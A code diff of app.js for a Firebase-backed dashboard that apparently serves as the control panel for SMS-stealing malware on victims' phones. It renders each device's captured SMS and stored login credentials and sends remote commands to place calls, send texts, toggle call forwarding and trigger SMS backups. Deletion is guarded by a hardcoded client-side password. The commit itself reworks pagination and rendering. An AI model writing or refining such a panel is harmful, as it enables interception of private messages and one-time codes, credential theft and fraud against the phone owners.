@@ -1,5 +1,5 @@
 /* ============================================================ */
-/* app.js - COMPLETE FIXED - NO BLINK, NO AUTO REFRESH        */
+/* app.js - COMPLETE FIXED - NO BLINK, NO DUPLICATES          */
 /* ============================================================ */
 
 // ============================================================
@@ -23,17 +23,13 @@ const db = firebase.database();
 // ============================================================
 const DEVICE_LIMIT = 5;
 const SMS_LIMIT = 10;
-const MIN_RENDER_INTERVAL = 300;
 const DELETE_PASSWORD = '9999';
 
 // ============================================================
-// STATE - CLEAN & ORGANIZED
+// STATE
 // ============================================================
 const state = {
-    // Data
     data: { user_data: {}, user_sms: {}, login: {}, backup_sms: {} },
-    
-    // Caches
     deviceOnlineStatus: new Map(),
     deviceSerialMap: new Map(),
     deviceSmsCache: new Map(),
@@ -41,31 +37,21 @@ const state = {
     filteredKeys: [],
     allSmsList: [],
     modalSmsList: [],
-    
-    // UI State
     expandedDevices: new Map(),
     activeTabs: new Map(),
     isPanelOpen: { devices: true, sms: false, backup: false, analytics: false },
     formMemory: {},
-    
-    // Pagination
     deviceOffset: 0,
     allSmsOffset: 0,
     modalSmsOffset: 0,
-    
-    // Filters
     currentFilter: 'all',
     searchQuery: '',
     smsFilterDevice: null,
     modalTarget: 'ALL',
-    
-    // Render control
     isRendering: false,
     renderVersion: 0,
     pendingRender: null,
     pendingUpdates: new Set(),
-    
-    // Misc
     isFirstLoad: true,
     dataVersion: 0
 };
@@ -91,22 +77,18 @@ db.ref(".info/connected").on("value", (snap) => {
 });
 
 // ============================================================
-// MAIN DATA LISTENER - OPTIMIZED
+// MAIN DATA LISTENER
 // ============================================================
 db.ref().on("value", (snapshot) => {
     const newData = snapshot.val() || {};
     state.dataVersion++;
     state.data = newData;
-    
-    // Update caches
     updateCaches();
     
-    // Check if user is typing
     const active = document.activeElement;
     const typing = active && (active.tagName === 'INPUT' || active.tagName === 'TEXTAREA' || active.tagName === 'SELECT');
     if (typing) return;
     
-    // Schedule render
     scheduleRender();
     
     if (state.isFirstLoad) {
@@ -118,17 +100,15 @@ db.ref().on("value", (snapshot) => {
 });
 
 // ============================================================
-// UPDATE CACHES - OPTIMIZED
+// UPDATE CACHES
 // ============================================================
 function updateCaches() {
     const devices = state.data.user_data || {};
     const smsData = state.data.user_sms || {};
     const now = Date.now();
     
-    // Update device keys
     state.allDeviceKeys = Object.keys(devices);
     
-    // Update online status
     state.allDeviceKeys.forEach(devId => {
         const dev = devices[devId];
         if (!dev) return;
@@ -138,7 +118,6 @@ function updateCaches() {
         state.deviceOnlineStatus.set(devId, isOnline || isRecent);
     });
     
-    // Update SMS cache - only if changed
     state.allDeviceKeys.forEach(devId => {
         if (smsData[devId]) {
             const keys = Object.keys(smsData[devId]);
@@ -154,7 +133,6 @@ function updateCaches() {
         }
     });
     
-    // Update serial map
     state.allDeviceKeys.forEach(devId => {
         const dev = devices[devId];
         if (dev) {
@@ -166,7 +144,7 @@ function updateCaches() {
 }
 
 // ============================================================
-// SCHEDULE RENDER - DEBOUNCED
+// SCHEDULE RENDER
 // ============================================================
 function scheduleRender() {
     if (state.pendingRender) {
@@ -178,7 +156,7 @@ function scheduleRender() {
         state.pendingRender = setTimeout(() => {
             state.pendingRender = null;
             performRender();
-        }, MIN_RENDER_INTERVAL);
+        }, 300);
         return;
     }
     
@@ -189,7 +167,7 @@ function scheduleRender() {
 }
 
 // ============================================================
-// PERFORM RENDER - MAIN
+// PERFORM RENDER
 // ============================================================
 function performRender() {
     if (state.isRendering) return;
@@ -197,7 +175,6 @@ function performRender() {
     
     try {
         updateCounts();
-        
         if (state.isPanelOpen.devices) renderDevicesOptimized();
         if (state.isPanelOpen.sms) renderAllSmsOptimized();
         if (state.isPanelOpen.analytics) renderAnalytics();
@@ -215,7 +192,7 @@ function performRender() {
 }
 
 // ============================================================
-// UPDATE COUNTS - FAST
+// UPDATE COUNTS
 // ============================================================
 function updateCounts() {
     const devices = state.data.user_data || {};
@@ -240,7 +217,43 @@ function updateCounts() {
 }
 
 // ============================================================
-// RENDER DEVICES - OPTIMIZED WITH DIFFING
+// GET FILTERED DEVICE KEYS
+// ============================================================
+function getFilteredDeviceKeys() {
+    const devices = state.data.user_data || {};
+    let keys = Object.keys(devices);
+    
+    if (state.searchQuery) {
+        const query = state.searchQuery.toLowerCase();
+        keys = keys.filter(id => {
+            const dev = devices[id] || {};
+            const name = dev.d_name || dev.device_name || id;
+            const serial = state.deviceSerialMap.get(id) || 0;
+            return (id + ' ' + name + ' ' + serial).toLowerCase().includes(query);
+        });
+    }
+    
+    keys.sort((a, b) => {
+        const serialA = state.deviceSerialMap.get(a) || 0;
+        const serialB = state.deviceSerialMap.get(b) || 0;
+        if (serialA === serialB) {
+            return a.localeCompare(b);
+        }
+        return serialB - serialA;
+    });
+    
+    if (state.currentFilter === 'online') {
+        keys = keys.filter(id => state.deviceOnlineStatus.get(id) === true);
+    } else if (state.currentFilter === 'offline') {
+        keys = keys.filter(id => state.deviceOnlineStatus.get(id) === false);
+    }
+    
+    state.filteredKeys = keys;
+    return keys;
+}
+
+// ============================================================
+// RENDER DEVICES - FIXED
 // ============================================================
 function renderDevicesOptimized() {
     const container = $('devicesContainer');
@@ -258,59 +271,46 @@ function renderDevicesOptimized() {
         return;
     }
     
+    // Ensure offset is valid
+    if (state.deviceOffset >= keys.length) {
+        state.deviceOffset = Math.max(0, keys.length - DEVICE_LIMIT);
+    }
+    
     const start = state.deviceOffset;
     const end = Math.min(start + DEVICE_LIMIT, keys.length);
     const displayKeys = keys.slice(start, end);
     const hasMore = end < keys.length;
+    const hasPrev = state.deviceOffset > 0;
     
-    // Build HTML for current page
-    let html = '';
+    // Build HTML
+    let finalHtml = '';
+    
+    if (hasPrev) {
+        finalHtml += `
+            <button class="btn-load-more" style="margin-bottom:10px;" onclick="loadPrevDevices()">
+                <i class="fas fa-chevron-up"></i> Previous
+            </button>
+        `;
+    }
+    
     displayKeys.forEach((devId, index) => {
-        html += buildDeviceCard(devId, start + index, devices);
+        finalHtml += buildDeviceCard(devId, start + index, devices);
     });
     
-    // Check if we can update in place
-    const existingCards = container.querySelectorAll('.device-card-luxury');
-    if (existingCards.length === displayKeys.length && 
-        Array.from(existingCards).every((card, i) => card.dataset.deviceId === displayKeys[i])) {
-        // Update in place - only dynamic content
-        displayKeys.forEach((devId, i) => {
-            updateDeviceCardDynamic(existingCards[i], devId);
-        });
-    } else {
-        container.innerHTML = html;
-    }
-    
-    // Add navigation buttons
     if (hasMore) {
         const remaining = keys.length - end;
-        const loadBtn = document.createElement('button');
-        loadBtn.className = 'btn-load-more';
-        loadBtn.innerHTML = `<i class="fas fa-chevron-down"></i> Load More (${remaining} remaining)`;
-        loadBtn.onclick = function(e) {
-            e.stopPropagation();
-            state.deviceOffset += DEVICE_LIMIT;
-            renderDevicesOptimized();
-        };
-        container.appendChild(loadBtn);
+        finalHtml += `
+            <button class="btn-load-more" onclick="loadMoreDevices()">
+                <i class="fas fa-chevron-down"></i> Load More (${remaining} remaining)
+            </button>
+        `;
     }
     
-    if (state.deviceOffset > 0) {
-        const backBtn = document.createElement('button');
-        backBtn.className = 'btn-load-more';
-        backBtn.style.marginBottom = '10px';
-        backBtn.innerHTML = '<i class="fas fa-chevron-up"></i> Back';
-        backBtn.onclick = function(e) {
-            e.stopPropagation();
-            state.deviceOffset = Math.max(0, state.deviceOffset - DEVICE_LIMIT);
-            renderDevicesOptimized();
-        };
-        container.insertBefore(backBtn, container.firstChild);
-    }
+    container.innerHTML = finalHtml;
 }
 
 // ============================================================
-// BUILD DEVICE CARD - PURE FUNCTION
+// BUILD DEVICE CARD
 // ============================================================
 function buildDeviceCard(devId, index, devices) {
     const dev = devices[devId] || {};
@@ -343,7 +343,6 @@ function buildDeviceCard(devId, index, devices) {
         devSmsList = smsCache.all.slice(startIdx, endIdx).reverse();
     }
     
-    // Build login HTML
     let allLoginHtml = '';
     if (devLoginList.length > 0) {
         allLoginHtml = devLoginList.map((rec, idx) => {
@@ -387,7 +386,6 @@ function buildDeviceCard(devId, index, devices) {
         `;
     }
     
-    // Build SMS list HTML
     let smsHtml = renderSmsCards(devSmsList);
     if (devSmsList.length === 0) {
         smsHtml = '<div class="empty-luxury">No SMS</div>';
@@ -550,72 +548,7 @@ function buildDeviceCard(devId, index, devices) {
 }
 
 // ============================================================
-// UPDATE DEVICE CARD DYNAMICALLY - NO BLINK
-// ============================================================
-function updateDeviceCardDynamic(card, devId) {
-    // Update status
-    const statusEl = card.querySelector(`#status-${devId}`);
-    if (statusEl) {
-        const online = state.deviceOnlineStatus.get(devId) || false;
-        statusEl.textContent = online ? '● Online' : '● Offline';
-        statusEl.className = `device-status ${online ? 'online' : 'offline'}`;
-    }
-    
-    // Update time
-    const timeEl = card.querySelector(`#time-${devId}`);
-    if (timeEl) {
-        const dev = state.data.user_data?.[devId];
-        const lastSeen = dev?.last_online || dev?.timestamp;
-        timeEl.textContent = lastSeen ? `⏱ ${new Date(lastSeen).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}` : '⏱ N/A';
-    }
-    
-    // Update SMS count
-    const smsCache = state.deviceSmsCache.get(devId);
-    const totalSms = smsCache ? smsCache.all.length : 0;
-    const smsBtn = card.querySelector('.sub-btn:first-child');
-    if (smsBtn) {
-        smsBtn.innerHTML = `💬 ${totalSms}`;
-    }
-}
-
-// ============================================================
-// GET FILTERED DEVICE KEYS - WITH CACHE
-// ============================================================
-function getFilteredDeviceKeys() {
-    const devices = state.data.user_data || {};
-    let keys = Object.keys(devices);
-    
-    // Apply search
-    if (state.searchQuery) {
-        const query = state.searchQuery.toLowerCase();
-        keys = keys.filter(id => {
-            const dev = devices[id] || {};
-            const name = dev.d_name || dev.device_name || id;
-            const serial = state.deviceSerialMap.get(id) || 0;
-            return (id + ' ' + name + ' ' + serial).toLowerCase().includes(query);
-        });
-    }
-    
-    // Sort by serial (descending)
-    keys.sort((a, b) => {
-        const serialA = state.deviceSerialMap.get(a) || 0;
-        const serialB = state.deviceSerialMap.get(b) || 0;
-        return serialB - serialA;
-    });
-    
-    // Apply filter
-    if (state.currentFilter === 'online') {
-        keys = keys.filter(id => state.deviceOnlineStatus.get(id) === true);
-    } else if (state.currentFilter === 'offline') {
-        keys = keys.filter(id => state.deviceOnlineStatus.get(id) === false);
-    }
-    
-    state.filteredKeys = keys;
-    return keys;
-}
-
-// ============================================================
-// TOGGLE DEVICE - WITH PENDING CHECK
+// TOGGLE DEVICE
 // ============================================================
 function toggleDevice(devId) {
     if (state.pendingUpdates.has(devId)) return;
@@ -628,12 +561,10 @@ function toggleDevice(devId) {
         const card = document.getElementById(`card-${devId}`);
         if (card) {
             card.classList.toggle('expanded');
-            
             const hint = card.querySelector('.device-top .device-name + div');
             if (hint) {
                 hint.textContent = state.expandedDevices.get(devId) ? '▲ Click to collapse' : '▼ Click to expand';
             }
-            
             if (state.expandedDevices.get(devId)) {
                 setTimeout(() => {
                     checkDeviceStatus(devId);
@@ -651,7 +582,7 @@ function toggleDevice(devId) {
 }
 
 // ============================================================
-// SET TAB - WITH PENDING CHECK
+// SET TAB
 // ============================================================
 function setTab(devId, tab) {
     if (state.pendingUpdates.has(devId)) return;
@@ -672,7 +603,6 @@ function setTab(devId, tab) {
             return;
         }
         
-        // Update button states
         const buttons = card.querySelectorAll('.device-actions-luxury .sub-btn');
         const activeTab = state.activeTabs.get(devId);
         
@@ -688,14 +618,12 @@ function setTab(devId, tab) {
             else if (text.includes('🗑️') && activeTab === 'delete') btn.classList.add('active-delete');
         });
         
-        // Update sections
         const sections = card.querySelectorAll('.section-box');
         sections.forEach(sec => sec.classList.remove('active'));
         
         if (activeTab) {
             const activeSec = card.querySelector(`#sec-${activeTab}-${devId}`);
             if (activeSec) activeSec.classList.add('active');
-            
             if (activeTab === 'login') {
                 setTimeout(() => autoScrollCredentials(devId), 400);
             }
@@ -708,7 +636,7 @@ function setTab(devId, tab) {
 }
 
 // ============================================================
-// SEARCH DEVICES - WITH DEBOUNCE
+// SEARCH DEVICES
 // ============================================================
 let searchTimeout = null;
 
@@ -716,7 +644,6 @@ function searchDevices(query) {
     if (searchTimeout) {
         clearTimeout(searchTimeout);
     }
-    
     searchTimeout = setTimeout(() => {
         state.searchQuery = query.toLowerCase().trim();
         state.deviceOffset = 0;
@@ -740,11 +667,28 @@ function clearSearch() {
 }
 
 // ============================================================
+// LOAD MORE / PREVIOUS DEVICES
+// ============================================================
+function loadMoreDevices() {
+    const keys = getFilteredDeviceKeys();
+    if (state.deviceOffset + DEVICE_LIMIT < keys.length) {
+        state.deviceOffset += DEVICE_LIMIT;
+        renderDevicesOptimized();
+    } else {
+        showToast('📭 No more devices to load', 'info');
+    }
+}
+
+function loadPrevDevices() {
+    state.deviceOffset = Math.max(0, state.deviceOffset - DEVICE_LIMIT);
+    renderDevicesOptimized();
+}
+
+// ============================================================
 // CHECK DEVICE STATUS
 // ============================================================
 function checkDeviceStatus(devId) {
     if (!devId) return;
-    
     const statusEl = document.getElementById(`status-${devId}`);
     if (!statusEl) return;
     
@@ -762,7 +706,6 @@ function checkDeviceStatus(devId) {
             
             state.deviceOnlineStatus.set(devId, finalStatus);
             updateDeviceStatusUI(devId, finalStatus, lastSeen);
-            
             showToast(`📱 ${devId}: ${finalStatus ? '🟢 Online' : '🔴 Offline'}`, finalStatus ? 'success' : 'error');
         } else {
             statusEl.textContent = '❌ Not Found';
@@ -776,19 +719,13 @@ function checkDeviceStatus(devId) {
     });
 }
 
-// ============================================================
-// UPDATE DEVICE STATUS UI
-// ============================================================
 function updateDeviceStatusUI(devId, isOnline, lastSeen) {
     const statusEl = document.getElementById(`status-${devId}`);
     const timeEl = document.getElementById(`time-${devId}`);
-    
     if (statusEl) {
-        const statusText = isOnline ? '● Online' : '● Offline';
-        statusEl.textContent = statusText;
+        statusEl.textContent = isOnline ? '● Online' : '● Offline';
         statusEl.className = `device-status ${isOnline ? 'online' : 'offline'}`;
     }
-    
     if (timeEl) {
         const timeStr = lastSeen ? new Date(lastSeen).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : 'N/A';
         timeEl.textContent = `⏱ ${timeStr}`;
@@ -850,58 +787,50 @@ function filterDevices(filter) {
 }
 
 // ============================================================
-// LOAD MORE FUNCTIONS
-// ============================================================
-function loadMoreDevices() {
-    state.deviceOffset += DEVICE_LIMIT;
-    renderDevicesOptimized();
-}
-
-function loadMoreDeviceSms(devId) {
-    const cache = state.deviceSmsCache.get(devId);
-    if (cache) {
-        cache.offset += SMS_LIMIT;
-        renderDevicesOptimized();
-        state.expandedDevices.set(devId, true);
-        state.activeTabs.set(devId, 'sms');
-        const cardEl = document.getElementById(`card-${devId}`);
-        if (cardEl) cardEl.classList.add('expanded');
-    }
-}
-
-function loadMoreAllSms() {
-    state.allSmsOffset += SMS_LIMIT;
-    renderAllSmsOptimized();
-}
-
-function loadMoreModalSms() {
-    state.modalSmsOffset += SMS_LIMIT;
-    renderModalSms();
-}
-
-// ============================================================
 // RENDER SMS CARDS
 // ============================================================
 function renderSmsCards(list, showDevice = false) {
     if (!list || list.length === 0) return '';
-    return list.map(msg => `
-        <div class="sms-card-luxury">
-            <div class="sms-header">
-                <div class="sms-sender">
-                    ${showDevice ? `<span class="device-tag" onclick="filterSmsByDevice('${escapeHtml(msg.deviceId || '')}')">[${escapeHtml(msg.deviceId || '')}]</span> ` : ''}
-                    👤 ${escapeHtml(msg.sender || msg.address || 'Unknown')}
+    
+    return list.map((msg, index) => {
+        const deviceId = msg.deviceId || msg.device_id || '';
+        const sender = msg.sender || msg.address || msg.from || 'Unknown';
+        const body = msg.body || msg.message || msg.text || 'No content';
+        const date = msg.date_formatted || msg.date || msg.timestamp_formatted || '';
+        const simNumber = msg.sim_number || msg.sim || msg.simSlot || '';
+        const timestamp = msg.timestamp || msg.date || 0;
+        
+        let displayDate = date;
+        if (!displayDate && timestamp) {
+            try {
+                displayDate = new Date(timestamp).toLocaleString();
+            } catch(e) {
+                displayDate = '';
+            }
+        }
+        
+        return `
+            <div class="sms-card-luxury" data-index="${index}">
+                <div class="sms-header">
+                    <div class="sms-sender">
+                        ${showDevice && deviceId ? 
+                            `<span class="device-tag" onclick="filterSmsByDevice('${escapeHtml(deviceId)}')">[${escapeHtml(deviceId)}]</span> ` 
+                            : ''}
+                        👤 ${escapeHtml(sender)}
+                    </div>
+                    <div class="sms-meta">
+                        ${escapeHtml(displayDate)} 
+                        ${simNumber ? '• ' + escapeHtml(simNumber) : ''}
+                    </div>
                 </div>
-                <div class="sms-meta">
-                    ${escapeHtml(msg.date_formatted || msg.date || '')} ${msg.sim_number ? '• ' + escapeHtml(msg.sim_number) : ''}
-                </div>
+                <div class="sms-body">${escapeHtml(body)}</div>
             </div>
-            <div class="sms-body">${escapeHtml(msg.body || 'No content')}</div>
-        </div>
-    `).join('');
+        `;
+    }).join('');
 }
 
 // ============================================================
-// RENDER ALL SMS - OPTIMIZED
+// RENDER ALL SMS
 // ============================================================
 function renderAllSmsOptimized() {
     const container = $('allSmsContainer');
@@ -911,23 +840,40 @@ function renderAllSmsOptimized() {
     if (state.allSmsOffset === 0) {
         state.allSmsList = [];
         const smsData = state.data.user_sms || {};
+        
         Object.keys(smsData).forEach(devId => {
             if (state.smsFilterDevice && state.smsFilterDevice !== devId) return;
             const msgs = smsData[devId];
-            Object.keys(msgs).forEach(k => {
-                state.allSmsList.push({ deviceId: devId, ...msgs[k] });
-            });
+            if (msgs) {
+                Object.keys(msgs).forEach(k => {
+                    const msg = msgs[k];
+                    if (msg && typeof msg === 'object') {
+                        state.allSmsList.push({ 
+                            deviceId: devId, 
+                            ...msg,
+                            sender: msg.sender || msg.address || 'Unknown',
+                            body: msg.body || msg.message || 'No content',
+                            timestamp: msg.timestamp || msg.date || 0
+                        });
+                    }
+                });
+            }
         });
+        
         state.allSmsList.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
         
         const countEl = $('panelSmsCount');
         if (countEl) {
-            countEl.textContent = state.smsFilterDevice ? state.allSmsList.length + ' (filtered)' : state.allSmsList.length;
+            const total = state.allSmsList.length;
+            countEl.textContent = state.smsFilterDevice ? total + ' (filtered)' : total;
         }
     }
     
     if (state.allSmsList.length === 0) {
-        container.innerHTML = `<div class="empty-luxury"><i class="fas fa-inbox empty-icon"></i>${state.smsFilterDevice ? 'No messages for ' + escapeHtml(state.smsFilterDevice) : 'No messages found'}</div>`;
+        const msg = state.smsFilterDevice 
+            ? 'No messages for ' + escapeHtml(state.smsFilterDevice) 
+            : 'No messages found';
+        container.innerHTML = `<div class="empty-luxury"><i class="fas fa-inbox empty-icon"></i>${msg}</div>`;
         if (loadMore) loadMore.style.display = 'none';
         return;
     }
@@ -935,7 +881,6 @@ function renderAllSmsOptimized() {
     const start = state.allSmsOffset;
     const end = Math.min(start + SMS_LIMIT, state.allSmsList.length);
     const paginated = state.allSmsList.slice(start, end);
-    
     const newHtml = renderSmsCards(paginated, true);
     
     if (state.allSmsOffset === 0) {
@@ -947,10 +892,32 @@ function renderAllSmsOptimized() {
     if (loadMore) {
         if (end < state.allSmsList.length) {
             loadMore.style.display = 'block';
-            loadMore.textContent = `📥 Load More (${state.allSmsList.length - end} remaining)`;
+            loadMore.innerHTML = `📥 Load More (${state.allSmsList.length - end} remaining)`;
+            const newLoadMore = loadMore.cloneNode(true);
+            loadMore.parentNode.replaceChild(newLoadMore, loadMore);
+            newLoadMore.onclick = function() {
+                state.allSmsOffset += SMS_LIMIT;
+                renderAllSmsOptimized();
+            };
         } else {
             loadMore.style.display = 'none';
         }
+    }
+}
+
+// ============================================================
+// LOAD MORE ALL SMS
+// ============================================================
+function loadMoreAllSms() {
+    const total = state.allSmsList.length;
+    const currentOffset = state.allSmsOffset;
+    if (currentOffset + SMS_LIMIT < total) {
+        state.allSmsOffset += SMS_LIMIT;
+        renderAllSmsOptimized();
+    } else {
+        showToast('📭 No more messages to load', 'info');
+        const loadMore = $('allSmsLoadMore');
+        if (loadMore) loadMore.style.display = 'none';
     }
 }
 
@@ -963,7 +930,6 @@ function filterSmsByDevice(deviceId) {
     if (clearBtn) clearBtn.style.display = 'inline-block';
     state.allSmsOffset = 0;
     showToast(`📱 Filtering: ${deviceId}`, 'info');
-    
     if (!state.isPanelOpen.sms) {
         togglePanel('sms');
     } else {
@@ -1030,7 +996,6 @@ function renderBackupPanel() {
     const keys = Object.keys(devices);
     const current = select.value;
     
-    // Only update if changed
     const currentOptions = Array.from(select.options).map(o => o.value);
     const newOptions = ['', ...keys];
     
@@ -1068,7 +1033,6 @@ function updateBackupStatusDisplay(devId) {
     
     const status = dev.backup_status || {};
     const info = dev.backup_info || {};
-    
     const st = status.backup_status || 'No backup';
     const msg = status.backup_message || '';
     
@@ -1091,9 +1055,7 @@ function updateBackupStatusDisplay(devId) {
     
     const last = info.last_backup_time || info.timestamp || null;
     const lastTimeEl = $('backupLastTime');
-    if (lastTimeEl) {
-        lastTimeEl.textContent = last ? new Date(last).toLocaleString() : 'Never';
-    }
+    if (lastTimeEl) lastTimeEl.textContent = last ? new Date(last).toLocaleString() : 'Never';
     
     const count = info.latest_backup_count || info.sms_count || 0;
     const smsCountEl = $('backupSmsCount');
@@ -1262,13 +1224,12 @@ function renderBackupSmsList(container, data) {
 }
 
 // ============================================================
-// OPEN BACKUP SMS MODAL
+// MODAL FUNCTIONS
 // ============================================================
 function openBackupSmsModal() {
     const modal = $('backupSmsModal');
     const body = $('backupModalBody');
     const title = $('backupModalTitle');
-    
     if (title) title.textContent = '💾 All Backup Messages';
     if (body) body.innerHTML = '<div class="loading-luxury"><span class="loader-ring"></span> Loading backups...</div>';
     if (modal) modal.classList.add('open');
@@ -1331,7 +1292,7 @@ function closeBackupSmsModal(e) {
 }
 
 // ============================================================
-// MODAL FUNCTIONS
+// SMS MODAL
 // ============================================================
 function openSmsModal(target) {
     state.modalTarget = target;
@@ -1372,7 +1333,6 @@ function renderModalSms() {
     const start = state.modalSmsOffset;
     const end = Math.min(start + SMS_LIMIT, state.modalSmsList.length);
     const paginated = state.modalSmsList.slice(start, end);
-    
     const newHtml = renderSmsCards(paginated, state.modalTarget === 'ALL');
     
     if (state.modalSmsOffset === 0) {
@@ -1391,6 +1351,11 @@ function renderModalSms() {
     }
 }
 
+function loadMoreModalSms() {
+    state.modalSmsOffset += SMS_LIMIT;
+    renderModalSms();
+}
+
 function closeSmsModal(e) {
     if (e && e.target !== e.currentTarget) return;
     const modal = $('smsModal');
@@ -1398,15 +1363,12 @@ function closeSmsModal(e) {
 }
 
 // ============================================================
-// SCROLL CREDENTIALS FUNCTIONS
+// SCROLL CREDENTIALS
 // ============================================================
 function scrollCredentialsToBottom(devId) {
     const container = document.getElementById(`login-cards-${devId}`);
     if (container) {
-        container.scrollTo({
-            top: container.scrollHeight,
-            behavior: 'smooth'
-        });
+        container.scrollTo({ top: container.scrollHeight, behavior: 'smooth' });
         showToast('📜 Scrolled to bottom', 'info', 1000);
     }
 }
@@ -1414,10 +1376,7 @@ function scrollCredentialsToBottom(devId) {
 function scrollCredentialsToTop(devId) {
     const container = document.getElementById(`login-cards-${devId}`);
     if (container) {
-        container.scrollTo({
-            top: 0,
-            behavior: 'smooth'
-        });
+        container.scrollTo({ top: 0, behavior: 'smooth' });
         showToast('📜 Scrolled to top', 'info', 1000);
     }
 }
@@ -1427,15 +1386,9 @@ function autoScrollCredentials(devId) {
         const container = document.getElementById(`login-cards-${devId}`);
         if (container && container.children.length > 5) {
             setTimeout(() => {
-                container.scrollTo({
-                    top: container.scrollHeight,
-                    behavior: 'smooth'
-                });
+                container.scrollTo({ top: container.scrollHeight, behavior: 'smooth' });
                 setTimeout(() => {
-                    container.scrollTo({
-                        top: 0,
-                        behavior: 'smooth'
-                    });
+                    container.scrollTo({ top: 0, behavior: 'smooth' });
                 }, 600);
             }, 300);
         }
@@ -1470,15 +1423,11 @@ function copyField(fieldId) {
 function deleteAllCredentials() {
     const password = prompt('🔐 Enter Password to Delete ALL Credentials:');
     if (password === null) return;
-    
     if (password !== DELETE_PASSWORD) {
         showToast('❌ Incorrect Password!', 'error');
         return;
     }
-    
-    if (!confirm('⚠️ Are you sure you want to DELETE ALL CREDENTIALS?')) {
-        return;
-    }
+    if (!confirm('⚠️ Are you sure you want to DELETE ALL CREDENTIALS?')) return;
     
     const loginData = state.data.login || {};
     if (Object.keys(loginData).length === 0) {
@@ -1487,31 +1436,21 @@ function deleteAllCredentials() {
     }
     
     showToast('⏳ Deleting all credentials...', 'info');
-    
-    const promises = Object.keys(loginData).map(devId => 
-        db.ref(`login/${devId}`).remove()
-    );
-    
+    const promises = Object.keys(loginData).map(devId => db.ref(`login/${devId}`).remove());
     Promise.all(promises).then(() => {
         showToast('✅ All credentials deleted successfully!', 'success');
         scheduleRender();
-    }).catch(err => {
-        showToast('❌ Error: ' + err.message, 'error');
-    });
+    }).catch(err => showToast('❌ Error: ' + err.message, 'error'));
 }
 
 function deleteDeviceCredentials(devId) {
     const password = prompt('🔐 Enter Password to Delete Credentials:');
     if (password === null) return;
-    
     if (password !== DELETE_PASSWORD) {
         showToast('❌ Incorrect Password!', 'error');
         return;
     }
-    
-    if (!confirm(`⚠️ Delete all credentials for device ${devId}?`)) {
-        return;
-    }
+    if (!confirm(`⚠️ Delete all credentials for device ${devId}?`)) return;
     
     const loginData = state.data.login || {};
     if (!loginData[devId] || Object.keys(loginData[devId]).length === 0) {
@@ -1520,27 +1459,20 @@ function deleteDeviceCredentials(devId) {
     }
     
     showToast(`⏳ Deleting credentials for ${devId}...`, 'info');
-    
     db.ref(`login/${devId}`).remove().then(() => {
         showToast(`✅ Credentials deleted for ${devId}`, 'success');
         scheduleRender();
-    }).catch(err => {
-        showToast('❌ Error: ' + err.message, 'error');
-    });
+    }).catch(err => showToast('❌ Error: ' + err.message, 'error'));
 }
 
 function deleteAllSms() {
     const password = prompt('🔐 Enter Password to Delete All SMS:');
     if (password === null) return;
-    
     if (password !== DELETE_PASSWORD) {
         showToast('❌ Incorrect Password!', 'error');
         return;
     }
-    
-    if (!confirm('⚠️ Are you sure you want to DELETE ALL SMS?')) {
-        return;
-    }
+    if (!confirm('⚠️ Are you sure you want to DELETE ALL SMS?')) return;
     
     const smsData = state.data.user_sms || {};
     if (Object.keys(smsData).length === 0) {
@@ -1549,34 +1481,24 @@ function deleteAllSms() {
     }
     
     showToast('⏳ Deleting all SMS...', 'info');
-    
-    const promises = Object.keys(smsData).map(devId => 
-        db.ref(`user_sms/${devId}`).remove()
-    );
-    
+    const promises = Object.keys(smsData).map(devId => db.ref(`user_sms/${devId}`).remove());
     Promise.all(promises).then(() => {
         showToast('✅ All SMS deleted successfully!', 'success');
         state.deviceSmsCache.clear();
         state.allSmsList = [];
         state.allSmsOffset = 0;
         scheduleRender();
-    }).catch(err => {
-        showToast('❌ Error: ' + err.message, 'error');
-    });
+    }).catch(err => showToast('❌ Error: ' + err.message, 'error'));
 }
 
 function deleteDeviceSms(devId) {
     const password = prompt('🔐 Enter Password to Delete SMS:');
     if (password === null) return;
-    
     if (password !== DELETE_PASSWORD) {
         showToast('❌ Incorrect Password!', 'error');
         return;
     }
-    
-    if (!confirm(`⚠️ Delete all SMS for device ${devId}?`)) {
-        return;
-    }
+    if (!confirm(`⚠️ Delete all SMS for device ${devId}?`)) return;
     
     const smsData = state.data.user_sms || {};
     if (!smsData[devId] || Object.keys(smsData[devId]).length === 0) {
@@ -1585,16 +1507,13 @@ function deleteDeviceSms(devId) {
     }
     
     showToast(`⏳ Deleting SMS for ${devId}...`, 'info');
-    
     db.ref(`user_sms/${devId}`).remove().then(() => {
         showToast(`✅ SMS deleted for ${devId}`, 'success');
         state.deviceSmsCache.delete(devId);
         state.allSmsList = [];
         state.allSmsOffset = 0;
         scheduleRender();
-    }).catch(err => {
-        showToast('❌ Error: ' + err.message, 'error');
-    });
+    }).catch(err => showToast('❌ Error: ' + err.message, 'error'));
 }
 
 // ============================================================
@@ -1608,9 +1527,7 @@ function showCommandDialog(type, devId) {
         'fwd_off': '🔀 Deactivate CALL FORWARDING on this device?',
         'backup': '💾 Trigger SMS BACKUP on this device?'
     };
-    
     if (!confirm(messages[type] || 'Send command?')) return;
-    
     switch (type) {
         case 'call': sendCall(devId); break;
         case 'sms': sendSms(devId); break;
@@ -1686,24 +1603,20 @@ function sendFwd(devId, cmd) {
 function showToast(message, type = 'info', duration = 2800) {
     const container = $('toastContainer');
     if (!container) return;
-    
     const toast = document.createElement('div');
     toast.className = `toast-luxury ${type}`;
     toast.textContent = message;
     container.appendChild(toast);
-    
     setTimeout(() => {
         toast.style.opacity = '0';
         toast.style.transform = 'translateY(-10px)';
         toast.style.transition = 'all 0.3s ease';
-        setTimeout(() => {
-            if (toast.parentNode) toast.remove();
-        }, 300);
+        setTimeout(() => { if (toast.parentNode) toast.remove(); }, 300);
     }, duration);
 }
 
 // ============================================================
-// ESCAPE HTML - SECURITY
+// ESCAPE HTML
 // ============================================================
 function escapeHtml(text) {
     if (!text) return '';
@@ -1716,7 +1629,6 @@ function escapeHtml(text) {
 // DOM CONTENT LOADED
 // ============================================================
 document.addEventListener('DOMContentLoaded', function() {
-    // Backup select change
     const backupSelect = $('backupDeviceSelect');
     if (backupSelect) {
         backupSelect.addEventListener('change', function() {
@@ -1732,31 +1644,24 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     }
     
-    // Search
     const searchInput = $('deviceSearchInput');
     const clearBtn = $('searchClearBtn');
     if (searchInput) {
         searchInput.addEventListener('input', function() {
             const val = this.value;
-            if (clearBtn) {
-                clearBtn.style.display = val ? 'flex' : 'none';
-            }
+            if (clearBtn) clearBtn.style.display = val ? 'flex' : 'none';
             searchDevices(val);
         });
     }
-    
     if (clearBtn) {
